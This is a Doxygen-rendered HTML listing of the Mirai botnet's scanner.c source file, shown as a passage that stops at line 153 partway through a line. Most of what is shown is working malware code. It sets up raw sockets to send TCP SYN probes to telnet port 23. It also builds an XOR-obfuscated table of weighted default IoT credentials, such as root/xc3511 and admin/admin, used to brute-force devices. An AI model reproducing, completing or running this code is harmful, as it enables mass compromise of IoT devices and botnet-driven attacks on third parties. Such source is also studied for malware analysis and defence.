<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/xhtml;charset=UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=9"/>
<meta name="generator" content="Doxygen 1.8.11"/>
<title>Mirai: mirai/bot/scanner.c Source File</title>
<link href="tabs.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="jquery.js"></script>
<script type="text/javascript" src="dynsections.js"></script>
<link href="navtree.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="resize.js"></script>
<script type="text/javascript" src="navtreedata.js"></script>
<script type="text/javascript" src="navtree.js"></script>
<script type="text/javascript">
  $(document).ready(initResizable);
  $(window).load(resizeHeight);
</script>
<link href="search/search.css" rel="stylesheet" type="text/css"/>
<script type="text/javascript" src="search/searchdata.js"></script>
<script type="text/javascript" src="search/search.js"></script>
<script type="text/javascript">
  $(document).ready(function() { init_search(); });
</script>
<link href="doxygen.css" rel="stylesheet" type="text/css" />
</head>
<body>
<div id="top"><!-- do not remove this div, it is closed by doxygen! -->
<div id="titlearea">
<table cellspacing="0" cellpadding="0">
 <tbody>
 <tr style="height: 56px;">
  <td id="projectalign" style="padding-left: 0.5em;">
   <div id="projectname">Mirai
   </div>
  </td>
 </tr>
 </tbody>
</table>
</div>
<!-- end header part -->
<!-- Generated by Doxygen 1.8.11 -->
<script type="text/javascript">
var searchBox = new SearchBox("searchBox", "search",false,'Search');
</script>
  <div id="navrow1" class="tabs">
    <ul class="tablist">
      <li><a href="index.html"><span>Main&#160;Page</span></a></li>
      <li><a href="pages.html"><span>Related&#160;Pages</span></a></li>
      <li><a href="annotated.html"><span>Data&#160;Structures</span></a></li>
      <li class="current"><a href="files.html"><span>Files</span></a></li>
      <li>
        <div id="MSearchBox" class="MSearchBoxInactive">
        <span class="left">
          <img id="MSearchSelect" src="search/mag_sel.png"
               onmouseover="return searchBox.OnSearchSelectShow()"
               onmouseout="return searchBox.OnSearchSelectHide()"
               alt=""/>
          <input type="text" id="MSearchField" value="Search" accesskey="S"
               onfocus="searchBox.OnSearchFieldFocus(true)" 
               onblur="searchBox.OnSearchFieldFocus(false)" 
               onkeyup="searchBox.OnSearchFieldChange(event)"/>
          </span><span class="right">
            <a id="MSearchClose" href="javascript:searchBox.CloseResultsWindow()"><img id="MSearchCloseImg" border="0" src="search/close.png" alt=""/></a>
          </span>
        </div>
      </li>
    </ul>
  </div>
  <div id="navrow2" class="tabs2">
    <ul class="tablist">
      <li><a href="files.html"><span>File&#160;List</span></a></li>
      <li><a href="globals.html"><span>Globals</span></a></li>
    </ul>
  </div>
</div><!-- top -->
<div id="side-nav" class="ui-resizable side-nav-resizable">
  <div id="nav-tree">
    <div id="nav-tree-contents">
      <div id="nav-sync" class="sync"></div>
    </div>
  </div>
  <div id="splitbar" style="-moz-user-select:none;" 
       class="ui-resizable-handle">
  </div>
</div>
<script type="text/javascript">
$(document).ready(function(){initNavTree('scanner_8c_source.html','');});
</script>
<div id="doc-content">
<!-- window showing the filter options -->
<div id="MSearchSelectWindow"
     onmouseover="return searchBox.OnSearchSelectShow()"
     onmouseout="return searchBox.OnSearchSelectHide()"
     onkeydown="return searchBox.OnSearchSelectKey(event)">
</div>

<!-- iframe showing the search results (closed by default) -->
<div id="MSearchResultsWindow">
<iframe src="javascript:void(0)" frameborder="0" 
        name="MSearchResults" id="MSearchResults">
</iframe>
</div>

<div class="header">
  <div class="headertitle">
<div class="title">scanner.c</div>  </div>
</div><!--header-->
<div class="contents">
<a href="scanner_8c.html">Go to the documentation of this file.</a><div class="fragment"><div class="line"><a name="l00001"></a><span class="lineno"><a class="line" href="scanner_8c.html#a369266c24eacffb87046522897a570d5">    1</a></span>&#160;<span class="preprocessor">#define _GNU_SOURCE</span></div><div class="line"><a name="l00002"></a><span class="lineno">    2</span>&#160;</div><div class="line"><a name="l00003"></a><span class="lineno">    3</span>&#160;<span class="preprocessor">#ifdef MIRAI_TELNET</span></div><div class="line"><a name="l00004"></a><span class="lineno">    4</span>&#160;</div><div class="line"><a name="l00005"></a><span class="lineno">    5</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00006"></a><span class="lineno">    6</span>&#160;<span class="preprocessor">#include &lt;stdio.h&gt;</span></div><div class="line"><a name="l00007"></a><span class="lineno">    7</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00008"></a><span class="lineno">    8</span>&#160;<span class="preprocessor">#include &lt;unistd.h&gt;</span></div><div class="line"><a name="l00009"></a><span class="lineno">    9</span>&#160;<span class="preprocessor">#include &lt;stdlib.h&gt;</span></div><div class="line"><a name="l00010"></a><span class="lineno">   10</span>&#160;<span class="preprocessor">#include &lt;sys/socket.h&gt;</span></div><div class="line"><a name="l00011"></a><span class="lineno">   11</span>&#160;<span class="preprocessor">#include &lt;arpa/inet.h&gt;</span></div><div class="line"><a name="l00012"></a><span class="lineno">   12</span>&#160;<span class="preprocessor">#include &lt;sys/select.h&gt;</span></div><div class="line"><a name="l00013"></a><span class="lineno">   13</span>&#160;<span class="preprocessor">#include &lt;sys/types.h&gt;</span></div><div class="line"><a name="l00014"></a><span class="lineno">   14</span>&#160;<span class="preprocessor">#include &lt;time.h&gt;</span></div><div class="line"><a name="l00015"></a><span class="lineno">   15</span>&#160;<span class="preprocessor">#include &lt;fcntl.h&gt;</span></div><div class="line"><a name="l00016"></a><span class="lineno">   16</span>&#160;<span class="preprocessor">#include &lt;signal.h&gt;</span></div><div class="line"><a name="l00017"></a><span class="lineno">   17</span>&#160;<span class="preprocessor">#include &lt;errno.h&gt;</span></div><div class="line"><a name="l00018"></a><span class="lineno">   18</span>&#160;<span class="preprocessor">#include &lt;string.h&gt;</span></div><div class="line"><a name="l00019"></a><span class="lineno">   19</span>&#160;<span class="preprocessor">#include &lt;linux/ip.h&gt;</span></div><div class="line"><a name="l00020"></a><span class="lineno">   20</span>&#160;<span class="preprocessor">#include &lt;linux/tcp.h&gt;</span></div><div class="line"><a name="l00021"></a><span class="lineno">   21</span>&#160;</div><div class="line"><a name="l00022"></a><span class="lineno">   22</span>&#160;<span class="preprocessor">#include &quot;includes.h&quot;</span></div><div class="line"><a name="l00023"></a><span class="lineno">   23</span>&#160;<span class="preprocessor">#include &quot;<a class="code" href="scanner_8h.html">scanner.h</a>&quot;</span></div><div class="line"><a name="l00024"></a><span class="lineno">   24</span>&#160;<span class="preprocessor">#include &quot;<a class="code" href="table_8h.html">table.h</a>&quot;</span></div><div class="line"><a name="l00025"></a><span class="lineno">   25</span>&#160;<span class="preprocessor">#include &quot;<a class="code" href="rand_8h.html">rand.h</a>&quot;</span></div><div class="line"><a name="l00026"></a><span class="lineno">   26</span>&#160;<span class="preprocessor">#include &quot;util.h&quot;</span></div><div class="line"><a name="l00027"></a><span class="lineno">   27</span>&#160;<span class="preprocessor">#include &quot;<a class="code" href="checksum_8h.html">checksum.h</a>&quot;</span></div><div class="line"><a name="l00028"></a><span class="lineno">   28</span>&#160;<span class="preprocessor">#include &quot;<a class="code" href="resolv_8h.html">resolv.h</a>&quot;</span></div><div class="line"><a name="l00029"></a><span class="lineno">   29</span>&#160;</div><div class="line"><a name="l00030"></a><span class="lineno">   30</span>&#160;<span class="keywordtype">int</span> scanner_pid, rsck, rsck_out, auth_table_len = 0;</div><div class="line"><a name="l00031"></a><span class="lineno">   31</span>&#160;<span class="keywordtype">char</span> scanner_rawpkt[<span class="keyword">sizeof</span> (<span class="keyword">struct </span>iphdr) + sizeof (struct tcphdr)] = {0};</div><div class="line"><a name="l00032"></a><span class="lineno">   32</span>&#160;<span class="keyword">struct </span><a class="code" href="structscanner__auth.html">scanner_auth</a> *auth_table = NULL;</div><div class="line"><a name="l00033"></a><span class="lineno">   33</span>&#160;<span class="keyword">struct </span><a class="code" href="structscanner__connection.html">scanner_connection</a> *conn_table;</div><div class="line"><a name="l00034"></a><span class="lineno">   34</span>&#160;uint16_t auth_table_max_weight = 0;</div><div class="line"><a name="l00035"></a><span class="lineno">   35</span>&#160;uint32_t fake_time = 0;</div><div class="line"><a name="l00036"></a><span class="lineno">   36</span>&#160;</div><div class="line"><a name="l00037"></a><span class="lineno">   37</span>&#160;<span class="keywordtype">int</span> recv_strip_null(<span class="keywordtype">int</span> sock, <span class="keywordtype">void</span> *buf, <span class="keywordtype">int</span> len, <span class="keywordtype">int</span> flags)</div><div class="line"><a name="l00038"></a><span class="lineno">   38</span>&#160;{</div><div class="line"><a name="l00039"></a><span class="lineno">   39</span>&#160;    <span class="keywordtype">int</span> ret = recv(sock, buf, len, flags);</div><div class="line"><a name="l00040"></a><span class="lineno">   40</span>&#160;</div><div class="line"><a name="l00041"></a><span class="lineno">   41</span>&#160;    <span class="keywordflow">if</span> (ret &gt; 0)</div><div class="line"><a name="l00042"></a><span class="lineno">   42</span>&#160;    {</div><div class="line"><a name="l00043"></a><span class="lineno">   43</span>&#160;        <span class="keywordtype">int</span> i = 0;</div><div class="line"><a name="l00044"></a><span class="lineno">   44</span>&#160;</div><div class="line"><a name="l00045"></a><span class="lineno">   45</span>&#160;        <span class="keywordflow">for</span>(i = 0; i &lt; ret; i++)</div><div class="line"><a name="l00046"></a><span class="lineno">   46</span>&#160;        {</div><div class="line"><a name="l00047"></a><span class="lineno">   47</span>&#160;            <span class="keywordflow">if</span> (((<span class="keywordtype">char</span> *)buf)[i] == 0x00)</div><div class="line"><a name="l00048"></a><span class="lineno">   48</span>&#160;            {</div><div class="line"><a name="l00049"></a><span class="lineno">   49</span>&#160;                ((<span class="keywordtype">char</span> *)buf)[i] = <span class="charliteral">&#39;A&#39;</span>;</div><div class="line"><a name="l00050"></a><span class="lineno">   50</span>&#160;            }</div><div class="line"><a name="l00051"></a><span class="lineno">   51</span>&#160;        }</div><div class="line"><a name="l00052"></a><span class="lineno">   52</span>&#160;    }</div><div class="line"><a name="l00053"></a><span class="lineno">   53</span>&#160;</div><div class="line"><a name="l00054"></a><span class="lineno">   54</span>&#160;    <span class="keywordflow">return</span> ret;</div><div class="line"><a name="l00055"></a><span class="lineno">   55</span>&#160;}</div><div class="line"><a name="l00056"></a><span class="lineno">   56</span>&#160;</div><div class="line"><a name="l00057"></a><span class="lineno">   57</span>&#160;<span class="keywordtype">void</span> <a class="code" href="scanner_8h.html#aec54f69564fbbbac5032deae9361438a">scanner_init</a>(<span class="keywordtype">void</span>)</div><div class="line"><a name="l00058"></a><span class="lineno">   58</span>&#160;{</div><div class="line"><a name="l00059"></a><span class="lineno">   59</span>&#160;    <span class="keywordtype">int</span> i;</div><div class="line"><a name="l00060"></a><span class="lineno">   60</span>&#160;    uint16_t source_port;</div><div class="line"><a name="l00061"></a><span class="lineno">   61</span>&#160;    <span class="keyword">struct </span>iphdr *iph;</div><div class="line"><a name="l00062"></a><span class="lineno">   62</span>&#160;    <span class="keyword">struct </span>tcphdr *tcph;</div><div class="line"><a name="l00063"></a><span class="lineno">   63</span>&#160;</div><div class="line"><a name="l00064"></a><span class="lineno">   64</span>&#160;    <span class="comment">// Let parent continue on main thread</span></div><div class="line"><a name="l00065"></a><span class="lineno">   65</span>&#160;    scanner_pid = fork();</div><div class="line"><a name="l00066"></a><span class="lineno">   66</span>&#160;    <span class="keywordflow">if</span> (scanner_pid &gt; 0 || scanner_pid == -1)</div><div class="line"><a name="l00067"></a><span class="lineno">   67</span>&#160;        <span class="keywordflow">return</span>;</div><div class="line"><a name="l00068"></a><span class="lineno">   68</span>&#160;</div><div class="line"><a name="l00069"></a><span class="lineno">   69</span>&#160;    <a class="code" href="mirai_2bot_2includes_8h.html#aecb64c7238a325af454cf5e17d933ff2">LOCAL_ADDR</a> = <a class="code" href="mirai_2bot_2util_8c.html#a27b56c2508008233898cb5e1766593c1">util_local_addr</a>();</div><div class="line"><a name="l00070"></a><span class="lineno">   70</span>&#160;</div><div class="line"><a name="l00071"></a><span class="lineno">   71</span>&#160;    <a class="code" href="rand_8c.html#ab74192959d5c945feaf0a630b58fd123">rand_init</a>();</div><div class="line"><a name="l00072"></a><span class="lineno">   72</span>&#160;    fake_time = time(NULL);</div><div class="line"><a name="l00073"></a><span class="lineno">   73</span>&#160;    conn_table = calloc(<a class="code" href="scanner_8h.html#a1a530c3cd75361d34847e8c60a95312a">SCANNER_MAX_CONNS</a>, <span class="keyword">sizeof</span> (<span class="keyword">struct</span> <a class="code" href="structscanner__connection.html">scanner_connection</a>));</div><div class="line"><a name="l00074"></a><span class="lineno">   74</span>&#160;    <span class="keywordflow">for</span> (i = 0; i &lt; <a class="code" href="scanner_8h.html#a1a530c3cd75361d34847e8c60a95312a">SCANNER_MAX_CONNS</a>; i++)</div><div class="line"><a name="l00075"></a><span class="lineno">   75</span>&#160;    {</div><div class="line"><a name="l00076"></a><span class="lineno">   76</span>&#160;        conn_table[i].<a class="code" href="structscanner__connection.html#ad4ebee7d3f91bebc38fe22523b599735">state</a> = SC_CLOSED;</div><div class="line"><a name="l00077"></a><span class="lineno">   77</span>&#160;        conn_table[i].<a class="code" href="structscanner__connection.html#a83a303fb240fe9aaf0fefa00cfd2ac9b">fd</a> = -1;</div><div class="line"><a name="l00078"></a><span class="lineno">   78</span>&#160;    }</div><div class="line"><a name="l00079"></a><span class="lineno">   79</span>&#160;</div><div class="line"><a name="l00080"></a><span class="lineno">   80</span>&#160;    <span class="comment">// Set up raw socket scanning and payload</span></div><div class="line"><a name="l00081"></a><span class="lineno">   81</span>&#160;    <span class="keywordflow">if</span> ((rsck = <a class="code" href="wget_8c.html#aa8318fbee111c5bde5952c63e894c962">socket</a>(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)</div><div class="line"><a name="l00082"></a><span class="lineno">   82</span>&#160;    {</div><div class="line"><a name="l00083"></a><span class="lineno">   83</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00084"></a><span class="lineno">   84</span>&#160;        printf(<span class="stringliteral">&quot;[scanner] Failed to initialize raw socket, cannot scan\n&quot;</span>);</div><div class="line"><a name="l00085"></a><span class="lineno">   85</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00086"></a><span class="lineno">   86</span>&#160;        exit(0);</div><div class="line"><a name="l00087"></a><span class="lineno">   87</span>&#160;    }</div><div class="line"><a name="l00088"></a><span class="lineno">   88</span>&#160;    fcntl(rsck, F_SETFL, O_NONBLOCK | fcntl(rsck, F_GETFL, 0));</div><div class="line"><a name="l00089"></a><span class="lineno">   89</span>&#160;    i = 1;</div><div class="line"><a name="l00090"></a><span class="lineno">   90</span>&#160;    <span class="keywordflow">if</span> (setsockopt(rsck, IPPROTO_IP, IP_HDRINCL, &amp;i, <span class="keyword">sizeof</span> (i)) != 0)</div><div class="line"><a name="l00091"></a><span class="lineno">   91</span>&#160;    {</div><div class="line"><a name="l00092"></a><span class="lineno">   92</span>&#160;<span class="preprocessor">#ifdef DEBUG</span></div><div class="line"><a name="l00093"></a><span class="lineno">   93</span>&#160;        printf(<span class="stringliteral">&quot;[scanner] Failed to set IP_HDRINCL, cannot scan\n&quot;</span>);</div><div class="line"><a name="l00094"></a><span class="lineno">   94</span>&#160;<span class="preprocessor">#endif</span></div><div class="line"><a name="l00095"></a><span class="lineno">   95</span>&#160;        <a class="code" href="wget_8c.html#a9c7f6d5331abb2692a876d5ee67474b7">close</a>(rsck);</div><div class="line"><a name="l00096"></a><span class="lineno">   96</span>&#160;        exit(0);</div><div class="line"><a name="l00097"></a><span class="lineno">   97</span>&#160;    }</div><div class="line"><a name="l00098"></a><span class="lineno">   98</span>&#160;</div><div class="line"><a name="l00099"></a><span class="lineno">   99</span>&#160;    <span class="keywordflow">do</span></div><div class="line"><a name="l00100"></a><span class="lineno">  100</span>&#160;    {</div><div class="line"><a name="l00101"></a><span class="lineno">  101</span>&#160;        source_port = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00102"></a><span class="lineno">  102</span>&#160;    }</div><div class="line"><a name="l00103"></a><span class="lineno">  103</span>&#160;    <span class="keywordflow">while</span> (ntohs(source_port) &lt; 1024);</div><div class="line"><a name="l00104"></a><span class="lineno">  104</span>&#160;</div><div class="line"><a name="l00105"></a><span class="lineno">  105</span>&#160;    iph = (<span class="keyword">struct </span>iphdr *)scanner_rawpkt;</div><div class="line"><a name="l00106"></a><span class="lineno">  106</span>&#160;    tcph = (<span class="keyword">struct </span>tcphdr *)(iph + 1);</div><div class="line"><a name="l00107"></a><span class="lineno">  107</span>&#160;</div><div class="line"><a name="l00108"></a><span class="lineno">  108</span>&#160;    <span class="comment">// Set up IPv4 header</span></div><div class="line"><a name="l00109"></a><span class="lineno">  109</span>&#160;    iph-&gt;ihl = 5;</div><div class="line"><a name="l00110"></a><span class="lineno">  110</span>&#160;    iph-&gt;version = 4;</div><div class="line"><a name="l00111"></a><span class="lineno">  111</span>&#160;    iph-&gt;tot_len = htons(<span class="keyword">sizeof</span> (<span class="keyword">struct</span> iphdr) + <span class="keyword">sizeof</span> (<span class="keyword">struct</span> tcphdr));</div><div class="line"><a name="l00112"></a><span class="lineno">  112</span>&#160;    iph-&gt;id = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>();</div><div class="line"><a name="l00113"></a><span class="lineno">  113</span>&#160;    iph-&gt;ttl = 64;</div><div class="line"><a name="l00114"></a><span class="lineno">  114</span>&#160;    iph-&gt;protocol = IPPROTO_TCP;</div><div class="line"><a name="l00115"></a><span class="lineno">  115</span>&#160;</div><div class="line"><a name="l00116"></a><span class="lineno">  116</span>&#160;    <span class="comment">// Set up TCP header</span></div><div class="line"><a name="l00117"></a><span class="lineno">  117</span>&#160;    tcph-&gt;dest = htons(23);</div><div class="line"><a name="l00118"></a><span class="lineno">  118</span>&#160;    tcph-&gt;source = source_port;</div><div class="line"><a name="l00119"></a><span class="lineno">  119</span>&#160;    tcph-&gt;doff = 5;</div><div class="line"><a name="l00120"></a><span class="lineno">  120</span>&#160;    tcph-&gt;window = <a class="code" href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a>() &amp; 0xffff;</div><div class="line"><a name="l00121"></a><span class="lineno">  121</span>&#160;    tcph-&gt;syn = <a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>;</div><div class="line"><a name="l00122"></a><span class="lineno">  122</span>&#160;</div><div class="line"><a name="l00123"></a><span class="lineno">  123</span>&#160;    <span class="comment">// Set up passwords</span></div><div class="line"><a name="l00124"></a><span class="lineno">  124</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x5A\x41\x11\x17\x13\x13&quot;</span>, 10);                     <span class="comment">// root     xc3511</span></div><div class="line"><a name="l00125"></a><span class="lineno">  125</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x54\x4B\x58\x5A\x54&quot;</span>, 9);                          <span class="comment">// root     vizxv</span></div><div class="line"><a name="l00126"></a><span class="lineno">  126</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x43\x46\x4F\x4B\x4C&quot;</span>, 8);                          <span class="comment">// root     admin</span></div><div class="line"><a name="l00127"></a><span class="lineno">  127</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x43\x46\x4F\x4B\x4C&quot;</span>, <span class="stringliteral">&quot;\x43\x46\x4F\x4B\x4C&quot;</span>, 7);                      <span class="comment">// admin    admin</span></div><div class="line"><a name="l00128"></a><span class="lineno">  128</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x1A\x1A\x1A\x1A\x1A\x1A&quot;</span>, 6);                      <span class="comment">// root     888888</span></div><div class="line"><a name="l00129"></a><span class="lineno">  129</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x5A\x4F\x4A\x46\x4B\x52\x41&quot;</span>, 5);                  <span class="comment">// root     xmhdipc</span></div><div class="line"><a name="l00130"></a><span class="lineno">  130</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x46\x47\x44\x43\x57\x4E\x56&quot;</span>, 5);                  <span class="comment">// root     default</span></div><div class="line"><a name="l00131"></a><span class="lineno">  131</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x48\x57\x43\x4C\x56\x47\x41\x4A&quot;</span>, 5);              <span class="comment">// root     juantech</span></div><div class="line"><a name="l00132"></a><span class="lineno">  132</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x13\x10\x11\x16\x17\x14&quot;</span>, 5);                      <span class="comment">// root     123456</span></div><div class="line"><a name="l00133"></a><span class="lineno">  133</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x17\x16\x11\x10\x13&quot;</span>, 5);                          <span class="comment">// root     54321</span></div><div class="line"><a name="l00134"></a><span class="lineno">  134</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x51\x57\x52\x52\x4D\x50\x56&quot;</span>, <span class="stringliteral">&quot;\x51\x57\x52\x52\x4D\x50\x56&quot;</span>, 5);      <span class="comment">// support  support</span></div><div class="line"><a name="l00135"></a><span class="lineno">  135</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;&quot;</span>, 4);                                              <span class="comment">// root     (none)</span></div><div class="line"><a name="l00136"></a><span class="lineno">  136</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x43\x46\x4F\x4B\x4C&quot;</span>, <span class="stringliteral">&quot;\x52\x43\x51\x51\x55\x4D\x50\x46&quot;</span>, 4);          <span class="comment">// admin    password</span></div><div class="line"><a name="l00137"></a><span class="lineno">  137</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, 4);                              <span class="comment">// root     root</span></div><div class="line"><a name="l00138"></a><span class="lineno">  138</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x13\x10\x11\x16\x17&quot;</span>, 4);                          <span class="comment">// root     12345</span></div><div class="line"><a name="l00139"></a><span class="lineno">  139</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x57\x51\x47\x50&quot;</span>, <span class="stringliteral">&quot;\x57\x51\x47\x50&quot;</span>, 3);                              <span class="comment">// user     user</span></div><div class="line"><a name="l00140"></a><span class="lineno">  140</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x43\x46\x4F\x4B\x4C&quot;</span>, <span class="stringliteral">&quot;&quot;</span>, 3);                                          <span class="comment">// admin    (none)</span></div><div class="line"><a name="l00141"></a><span class="lineno">  141</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x52\x43\x51\x51&quot;</span>, 3);                              <span class="comment">// root     pass</span></div><div class="line"><a name="l00142"></a><span class="lineno">  142</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x43\x46\x4F\x4B\x4C&quot;</span>, <span class="stringliteral">&quot;\x43\x46\x4F\x4B\x4C\x13\x10\x11\x16&quot;</span>, 3);      <span class="comment">// admin    admin1234</span></div><div class="line"><a name="l00143"></a><span class="lineno">  143</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x13\x13\x13\x13&quot;</span>, 3);                              <span class="comment">// root     1111</span></div><div class="line"><a name="l00144"></a><span class="lineno">  144</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x43\x46\x4F\x4B\x4C&quot;</span>, <span class="stringliteral">&quot;\x51\x4F\x41\x43\x46\x4F\x4B\x4C&quot;</span>, 3);          <span class="comment">// admin    smcadmin</span></div><div class="line"><a name="l00145"></a><span class="lineno">  145</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x43\x46\x4F\x4B\x4C&quot;</span>, <span class="stringliteral">&quot;\x13\x13\x13\x13&quot;</span>, 2);                          <span class="comment">// admin    1111</span></div><div class="line"><a name="l00146"></a><span class="lineno">  146</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x14\x14\x14\x14\x14\x14&quot;</span>, 2);                      <span class="comment">// root     666666</span></div><div class="line"><a name="l00147"></a><span class="lineno">  147</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x52\x43\x51\x51\x55\x4D\x50\x46&quot;</span>, 2);              <span class="comment">// root     password</span></div><div class="line"><a name="l00148"></a><span class="lineno">  148</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x13\x10\x11\x16&quot;</span>, 2);                              <span class="comment">// root     1234</span></div><div class="line"><a name="l00149"></a><span class="lineno">  149</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x50\x4D\x4D\x56&quot;</span>, <span class="stringliteral">&quot;\x49\x4E\x54\x13\x10\x11&quot;</span>, 1);                      <span class="comment">// root     klv123</span></div><div class="line"><a name="l00150"></a><span class="lineno">  150</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x63\x46\x4F\x4B\x4C\x4B\x51\x56\x50\x43\x56\x4D\x50&quot;</span>, <span class="stringliteral">&quot;\x4F\x47\x4B\x4C\x51\x4F&quot;</span>, 1); <span class="comment">// Administrator admin</span></div><div class="line"><a name="l00151"></a><span class="lineno">  151</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x51\x47\x50\x54\x4B\x41\x47&quot;</span>, <span class="stringliteral">&quot;\x51\x47\x50\x54\x4B\x41\x47&quot;</span>, 1);      <span class="comment">// service  service</span></div><div class="line"><a name="l00152"></a><span class="lineno">  152</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50&quot;</span>, <span class="stringliteral">&quot;\x51\x57\x52\x47\x50\x54\x4B\x51\x4D\x50&quot;</span>, 1); <span class="comment">// supervisor supervisor</span></div><div class="line"><a name="l00153"></a><span class="lineno">  153</span>&#160;    <a class="code" href="scanner_8h.html#afd93b8811d7ab9c46d9196d60ee06950">add_auth_entry</a>(<span class="stringliteral">&quot;\x45\x57\x47\x51\x56&quot;</span>, <span class="stringliteral">&quot;\x45\x57\x47\x51\x56&quot;</span>, 1);                      <span class="comment">// guest    